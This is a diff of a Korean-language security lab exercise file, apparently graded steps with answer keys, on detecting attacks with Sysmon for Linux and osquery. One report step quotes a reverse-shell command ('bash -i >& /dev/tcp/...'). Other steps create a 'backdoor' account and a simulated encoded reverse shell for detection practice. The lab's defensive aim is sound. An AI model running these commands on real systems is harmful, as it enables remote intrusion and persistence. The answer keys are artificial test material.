@@ -55,7 +55,7 @@ steps:
       ## 💻 실행 명령 (호스트에서)
       ```bash
       systemctl is-active sysmon
-      sysmon -c 2>/dev/null | grep -E "ProcessCreate|NetworkConnect|FileCreate" | head
+      sysmon -c | grep -E "ProcessCreate|NetworkConnect|FileCreate" | head
       grep -ac "Linux-Sysmon" /var/log/syslog
       ```
       - `systemctl is-active sysmon` — eBPF 센서 데몬의 가동 여부(`active`/`inactive`).
@@ -73,7 +73,7 @@ steps:
       echo "=== sysmon 데몬 ==="
       systemctl is-active sysmon
       echo "=== config event 종류 ==="
-      sysmon -c 2>/dev/null | grep -E "ProcessCreate|NetworkConnect|FileCreate" | head
+      sysmon -c | grep -E "ProcessCreate|NetworkConnect|FileCreate" | head
       echo "=== syslog 적재량 ==="
       grep -ac "Linux-Sysmon" /var/log/syslog
     answer_detail: "Sysmon for Linux(el34 호스트에 1.5.2 설치)는 eBPF 센서로 호스트 커널 이벤트를 잡아 /var/log/syslog 에 Linux-Sysmon XML 로 기록한다. 컨테이너(el34-web)는 네임스페이스로 격리될 뿐 자체 커널이 없어, 컨테이너 안 프로세스도 결국 호스트 커널 프로세스 → 호스트 sysmon 이 그대로 포착한다. ccc 는 adm 그룹이라 sudo 없이 syslog 를 읽는다. 판정: systemctl 이 active 이고 config 에 3 EventID, syslog 적재가 0 이 아니면 센서·필터·적재 3박자가 살아 있는 것."
@@ -171,7 +171,7 @@ steps:
     category: detect
     points: 18
     answer: |
-      ssh ccc@10.20.32.80 python3 -c "import base64; base64.b64decode('aGk=')  # w11 revshell sim" 2>/dev/null
+      ssh ccc@10.20.32.80 python3 -c "import base64; base64.b64decode('aGk=')  # w11 revshell sim"
       sleep 2
       echo "=== osquery 스냅샷 (이미 종료된 프로세스 → 못 찾음) ==="
       ssh ccc@10.20.32.80 sudo osqueryi --json 'SELECT pid,cmdline FROM processes WHERE cmdline LIKE "%b64decode%";'
@@ -226,7 +226,7 @@ steps:
       nohup python3 -m http.server 53666 --bind 127.0.0.1 >/dev/null 2>&1 &
       sleep 1
       nc -w2 -z 127.0.0.1 53666 >/dev/null 2>&1
-      pkill -f "http.server 53666" 2>/dev/null
+      pkill -f "http.server 53666"
       sleep 2
       echo "=== sysmon NetworkConnect (포트 53666) ==="
       grep -a "Linux-Sysmon" /var/log/syslog | grep -a "<EventID>3<" | grep -a "53666" | tail -1 | cut -c1-200
@@ -314,9 +314,9 @@ steps:
       **WAF/웹 장비:** `ssh ccc@10.20.32.80`(비번 `1`)로 접속해 실행한다.
 
       ```bash
-      userdel -r smonbd 2>/dev/null; useradd -m -s /bin/bash smonbd && echo created
+      id smonbd >/dev/null 2>&1 && userdel -r smonbd; useradd -m -s /bin/bash smonbd && echo created
       osqueryi --json 'SELECT username,uid,shell FROM users WHERE username="smonbd";'
-      userdel -r smonbd 2>/dev/null; echo removed
+      id smonbd >/dev/null 2>&1 && userdel -r smonbd; echo removed
       ```
       - 1행: 백도어 계정 smonbd 생성(기존 잔재 먼저 제거 후).
       - osquery `users` 쿼리: 계정은 지속 상태라 스냅샷에 즉시 잡힘.
@@ -328,10 +328,10 @@ steps:
     category: response
     points: 12
     answer: |
-      ssh ccc@10.20.32.80 'sudo userdel -r smonbd 2>/dev/null; useradd -m -s /bin/bash smonbd && echo created'
+      ssh ccc@10.20.32.80 'sudo id smonbd >/dev/null 2>&1 && userdel -r smonbd; useradd -m -s /bin/bash smonbd && echo created'
       echo "=== osquery 백도어 계정 사냥 ==="
       ssh ccc@10.20.32.80 sudo osqueryi --json 'SELECT username,uid,shell FROM users WHERE username="smonbd";'
-      ssh ccc@10.20.32.80 'sudo userdel -r smonbd 2>/dev/null; echo removed'
+      ssh ccc@10.20.32.80 'sudo id smonbd >/dev/null 2>&1 && userdel -r smonbd; echo removed'
       echo "self-clean done"
     answer_detail: "백도어 계정은 '지속 상태'라 osquery 스냅샷이 강한 영역(조사 시점에 존재하면 무조건 보임). 단명 프로세스(sysmon만 잡음)와 달리 도구 역할이 나뉜다 — sysmon=순간 이벤트, osquery=상태 스냅샷."
     verify:
@@ -412,7 +412,7 @@ steps:
     category: report
     points: 7
     answer: |
-      cat <<'EOF'
+      cat > ~/w11_note1.md <<'EOF'
       # el34 W11 Sysmon 보고서
       ## 1. 호스트 sysmon(eBPF): 컨테이너 프로세스까지 포착, syslog Linux-Sysmon
       ## 2. base64 리버스셸: bash -i >& /dev/tcp/192.168.0.202/53666
@@ -425,6 +425,7 @@ steps:
       ## 4. osquery 스냅샷: 백도어 계정 smonbd(상태). 단, 단명 인코딩 프로세스는 놓침
       ## 5. 결론: 단명·인코딩·삭제된 흔적 = sysmon(이벤트), 지속 상태(계정/발판) = osquery(스냅샷). 보완 관계
       EOF
+      cat ~/w11_note1.md
     answer_detail: "sysmon(이벤트 스트림)과 osquery(스냅샷)는 보완. '그 순간'(단명 프로세스/연결/파일 생성)은 sysmon이, 현재 상태(계정/지속 발판)는 osquery가. 호스트 가시성의 두 축."
     verify:
       type: output_contains
@@ -452,7 +453,7 @@ steps:
 
       ```bash
       # ── el34-web 에서: 계정/payload 잔재 ──
-      id smonbd 2>/dev/null && echo "계정 잔재!" || echo "user ok"; ls /tmp/w11_payload.b64 2>/dev/null && echo "payload 잔재!" || echo "file ok"
+      id smonbd >/dev/null 2>&1 && echo "계정 잔재!" || echo "user ok"; ls /tmp/w11_payload.b64 >/dev/null 2>&1 && echo "payload 잔재!" || echo "file ok"
 
       # ── el34 호스트에서: 리스너 잔재 + sysmon 유지 ──
       pgrep -f "http.server 53666" && echo "리스너 잔재!" || echo "listener ok"
@@ -465,7 +466,7 @@ steps:
     category: cleanup
     points: 5
     answer: |
-      ssh ccc@10.20.32.80 'id smonbd 2>/dev/null && echo "계정 잔재!" || echo "user ok"; ls /tmp/w11_payload.b64 2>/dev/null && echo "payload 잔재!" || echo "file ok"'
+      ssh ccc@10.20.32.80 'id smonbd >/dev/null 2>&1 && echo "계정 잔재!" || echo "user ok"; ls /tmp/w11_payload.b64 >/dev/null 2>&1 && echo "payload 잔재!" || echo "file ok"'
       pgrep -f "http.server 53666" && echo "리스너 잔재!" || echo "listener ok"
       echo "sysmon(영속 유지): $(systemctl is-active sysmon)"
       echo "---check done---"
